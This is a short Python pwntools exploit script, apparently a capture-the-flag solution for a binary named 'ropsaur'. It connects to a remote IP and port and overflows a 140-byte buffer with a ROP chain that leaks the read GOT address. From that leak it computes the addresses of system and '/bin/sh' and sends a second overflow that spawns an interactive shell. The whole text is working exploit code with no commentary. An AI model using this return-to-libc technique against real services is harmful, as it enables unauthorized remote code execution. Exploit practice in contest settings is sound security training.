from pwn import *
binary='./ropsaur'
#s = process("./ropsaur")
s= remote('203.250.148.108',40202)
e=ELF(binary)
pppr = 0x080484B6
read_plt = 0x0804832C
read_func = 0x80483f4
s.sendline('\x90'*140+p32(0x0804830C)+p32(pppr)+p32(1)+p32(0x0804961C)+p32(4)+p32(0x080483f4))
read_got = u32(s.recv(4))
log.info('read_got : '+hex(read_got))
system = read_got-634192
binsh = read_got+548539
log.info('system : '+hex(system))
s.sendline('a'*140+p32(system)+'1111'+p32(binsh))
s.interactive()